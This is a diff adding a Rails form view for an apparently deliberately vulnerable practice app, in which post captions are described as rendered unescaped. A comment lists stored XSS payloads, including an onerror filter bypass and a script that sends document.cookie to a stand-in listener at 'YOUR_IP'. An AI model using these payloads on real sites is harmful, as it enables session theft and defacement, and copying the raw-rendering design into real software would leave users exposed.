@@ -1,0 +1,67 @@
+<div class="max-w-lg mx-auto">
+  <div class="bg-white border border-gray-200 rounded-2xl p-7 shadow-sm">
+
+    <h1 class="text-xl font-bold mb-1">Share a Post</h1>
+    <p class="text-sm text-gray-500 mb-6">
+      Caption and comments are rendered as raw HTML — XSS payloads will execute.
+    </p>
+
+    <%= form_with model: @post, local: true do |f| %>
+
+      <% if @post.errors.any? %>
+        <div class="bg-red-50 border border-red-200 text-red-700 text-sm rounded-lg px-4 py-3 mb-4">
+          <% @post.errors.full_messages.each do |msg| %>
+            <p><%= msg %></p>
+          <% end %>
+        </div>
+      <% end %>
+
+      <div class="mb-4">
+        <%= f.label :title, "Title", class: "block text-sm font-semibold text-gray-700 mb-1" %>
+        <%= f.text_field :title,
+            placeholder: "Give your post a title",
+            class: "w-full border border-gray-300 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400" %>
+      </div>
+
+      <div class="mb-4">
+        <%#
+          ⚠️  XSS INJECTION TARGET
+          This caption is stored and rendered with raw() on the
+          index (feed) and show pages — for every visitor.
+          Payloads to demonstrate:
+
+            Basic script tag:
+              <script>alert('Stored XSS via caption!')</script>
+
+            Image onerror (bypasses naive <script> filters):
+              <img src=x onerror="alert('no script tag needed')">
+
+            Cookie theft (replace IP with your listener):
+              <script>new Image().src='http://YOUR_IP:8000/?c='+document.cookie</script>
+
+            HTML injection / page defacement:
+              <h2 style="color:red">⚠️ Site hacked</h2>
+        %>
+        <%= f.label :caption, class: "block text-sm font-semibold text-gray-700 mb-1" do %>
+          Caption
+          <span class="text-red-500 font-normal text-xs">(XSS target — HTML is rendered unescaped)</span>
+        <% end %>
+        <%= f.text_area :caption,
+            placeholder: "Try: <script>alert('XSS')</script>",
+            rows: 4,
+            class: "w-full border border-gray-300 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400 resize-none" %>
+      </div>
+
+      <div class="mb-6">
+        <%= f.label :image_url, "Image URL (optional)", class: "block text-sm font-semibold text-gray-700 mb-1" %>
+        <%= f.text_field :image_url,
+            placeholder: "https://picsum.photos/600/400",
+            class: "w-full border border-gray-300 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400" %>
+      </div>
+
+      <%= f.submit "Share Post",
+          class: "w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 rounded-lg cursor-pointer transition" %>
+    <% end %>
+
+  </div>
+</div>
